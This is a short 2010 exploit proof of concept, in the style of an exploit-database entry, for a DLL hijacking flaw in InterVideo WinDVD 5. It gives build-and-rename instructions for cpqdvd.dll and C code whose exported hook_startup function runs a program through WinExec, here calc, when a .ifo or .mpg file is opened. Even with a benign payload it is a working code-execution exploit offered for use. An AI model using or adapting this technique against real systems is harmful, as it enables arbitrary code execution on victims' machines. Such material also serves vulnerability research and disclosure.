/*
# Greetz to :b0nd, Fbih2s,r45c4l,Charles ,j4ckh4x0r, punter,eberly, Charles, Dinesh Arora , Ganesha
# Site : www.BeenuArora.com

Exploit Title: InterVideo WinDVD 5 DLL Hijacking Exploit
Date: 25/08/2010
Author: Beenu Arora
Tested on: Windows XP SP3 , WinDVD 5
Vulnerable extensions: .ifo , .mpg

Compile and rename to cpqdvd.dll, create a file in the same dir with one of
the following extensions:
.ifo , .mpg
*/

#include <windows.h>
#define DLLIMPORT __declspec (dllexport)

DLLIMPORT void hook_startup() { evil(); }

int evil()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}
